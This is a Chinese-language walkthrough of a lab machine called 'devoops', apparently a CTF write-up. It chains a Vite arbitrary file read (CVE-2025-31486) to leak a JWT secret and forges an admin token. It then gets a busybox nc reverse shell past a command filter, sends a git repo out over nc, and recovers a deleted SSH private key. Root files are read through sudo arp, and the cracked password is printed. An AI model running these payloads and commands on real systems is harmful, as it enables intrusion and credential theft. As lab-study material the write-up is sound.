# devoops
简单扫描了一下只开放了3000端口,是web服务,一个创建vue+express的项目指南
没什么头绪,目录扫描一下
![](vx_images/391064684510729.png)
![](vx_images/154738296796370.png)
![](vx_images/290093056887814.png)
依次查看/sign给除了jwt的令牌,server.js给出了一堆源码
![](vx_images/492145773436198.png)
注意到/excute需要权限,那么带上jwt访问
![](vx_images/516224233550115.png)
还是被拒绝了
审计一下源码,关键点就在于需要jwt的令牌role为admin才能执行命令
尝试爆破一下jwt的密钥(没成功)
```
app.get('/api/execute', async (req, res) => {
    const authorization_header_raw = req.headers['authorization'];
    if (!authorization_header_raw || !authorization_header_raw.startsWith('Bearer ')) {
        return res.status(401).json({
            'status': 'rejected',
            'data': 'permission denied'
        });
    }

    const jwt_raw = authorization_header_raw.split(' ')[1];

    try {
        const payload = jwt.verify(jwt_raw, process.env.JWT_SECRET);
        if (payload.role !== 'admin') {
            return res.status(403).json({
                'status': 'rejected',
                'data': 'permission denied'
            });
        }
    } catch (err) {
        return res.status(401).json({
            'status': 'rejected',
            'data': `permission denied`
        });
    }

    const command = req.query.cmd;

    const is_command_safe = is_safe_command(command);
    if (!is_command_safe) {
        return res.status(401).json({
            'status': 'rejected',
            'data': `this command is unsafe`
        });
    }

    const result = await execute_command_sync(command);

    return res.json({
        'status': result.status === true ? 'executed' : 'failed',
        'data': result.data
    })
});

```
看了下别人的思路,用到一个cve漏洞来读取env文件的内容,而恰jwt的密钥就在其中存储`process.env.JWT_SECRET`
CVE-2025-31486
```
描述
Vite 是一个用于 JavaScript 的前端工具框架。它可以将任意文件的内容返回给浏览器。通过在 `?.wasm?init` 或使用 `sec-fetch-dest: script` 脚本头添加 `?.svg`，可以绕过 `server.fs.deny` 的限制。这种绕过方法仅在文件小于 `build.assetsInlineLimit`（默认值：4kB）且使用 Vite 6.0 及更高版本时有效。
```
使用nuclei测试楼漏洞确实存在
http://192.168.56.114:3000/etc/passwd?.svg?.wasm?init
http://192.168.56.114:3000/@fs/etc/passwd?import&?inline=1.wasm?init
![](vx_images/54966652579864.png)
尝试读取env文件,路径:http://192.168.56.114:3000/.env?.svg?.wasm?init
![](vx_images/8275130753937.png)
JWT_SECRET='2942szKG7Ev83aDviugAa6rFpKixZzZz'
拿着密钥修改任意role字段为admin后即可在/excute处执行命令(注意在加上Authorization头时jwt前加上Bearer )
![](vx_images/430048194590814.png)
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjEsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc2OTc1OTE0Nn0.3iV67ylh1Hz968RLFv37VwFo8iqfEYxksYTLTofeNJ8
```
http://192.168.56.114:3000/execute?cmd=id
![](vx_images/202948171313424.png)
现在还需要绕过过滤
```
function is_safe_command(cmd) {
    if (!cmd || typeof cmd !== 'string') {
        return false;
    }
    if (COMMAND_FILTER.length === 0) {
        return false;
    }

    const lower_cmd = cmd.toLowerCase();

    for (const forbidden of COMMAND_FILTER) {
        const regex = new RegExp(`\\b${forbidden.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}\\b|^${forbidden.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}$`, 'i');
        if (regex.test(lower_cmd)) {
            return false;
        }
    }

    if (/[;&|]/.test(cmd)) {
        return false;
    }
    if (/[<>]/.test(cmd)) {
        return false;
    }
    if (/[`$()]/.test(cmd)) {
        return false;
    }

    return true;
}
```
主要是过滤了一些符号还有nc,python,python3,py,py3,bash,sh,ash,|,&,<,>,ls,cat,pwd,head,tail,grep,xxd都被过滤
```
http://192.168.56.114:3000/execute?cmd=busybox n\c 192.168.56.108 5555 -e /bin/s\h
```
成功获取shell
![](vx_images/404123845304434.png)
现在是普通用户runner,家目录下还有hana的用户
开放端口
![](vx_images/212637619718456.png)
这里用socat转发3002,22端口到3031和2222
socat TCP-LISTEN:3031,fork TCP:127.0.0.1:3002
socat TCP-LISTEN:2222,fork TCP:127.0.0.1:22
访问3031端口是一个api管理
http://192.168.56.114:3031/api/swagger
尝试带上我们之前获取的管理员jwt访问这些api但是失败了提示用户不存在
![](vx_images/202514422429685.png)
好像也不行,去搜索一下本地的git关键字
```
find / -type f -name "*git*" 2>/dev/null
find / -type d -name "*git*" 2>/dev/null
```
找到了一个git仓库
![](vx_images/244534641632954.png)
用git检查一下
先将文件夹node.git传到kali上
发送方:tar czvf - node.git | nc 192.168.56.108 3333
接收方:nc -l -p 3333 | pv | tar xzvf -
![](vx_images/396197960298618.png)
del:可能表示删除了某些内容
查看删除的内容
```
└─$ git show 1994a70bbd
commit 1994a70bbd080c633ac85a339fd85a8635c63893 (HEAD -> main)
Author: azwhikaru <37921907+azwhikaru@users.noreply.github.com>
Date:   Mon Apr 21 14:36:12 2025 +0800

    del: oops!

diff --git a/id_ed25519 b/id_ed25519
deleted file mode 100644
index a2626a4..0000000
--- a/id_ed25519
+++ /dev/null
@@ -1,7 +0,0 @@
------BEGIN OPENSSH PRIVATE KEY-----
-b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
-QyNTUxOQAAACCMB5xEc6A2I69whyZDcTSPGVsz2jivuziHAEXaAlJLrgAAAJgA8k3lAPJN
-5QAAAAtzc2gtZWQyNTUxOQAAACCMB5xEc6A2I69whyZDcTSPGVsz2jivuziHAEXaAlJLrg
-AAAEBX7jUWSgQUQgA8z8yL85Eg1WiSgijSu3C4x8TVF/G3uIwHnERzoDYjr3CHJkNxNI8Z
-WzPaOK+7OIcARdoCUkuuAAAAEGhhbmFAZGV2b29wcy5obXYBAgMEBQ==
------END OPENSSH PRIVATE KEY-----

```
泄露了ssh的私钥,使用其登录(注意删掉每一行开头的-符号)
```
ssh hana@192.168.56.114 -i temp -p 2222
```
![](vx_images/38353313455446.png)
查看权限
```
devoops:~$ sudo -l
Matching Defaults entries for hana on devoops:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for hana:
    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"

User hana may run the following commands on devoops:
    (root) NOPASSWD: /sbin/arp
    
```
使用arp命令读取root文件
```
sudo arp -v -f /path/to/input-file
```
好像文件名不是常规的,那就转头去读取/etc/shadow然后离线爆破了
密码eris






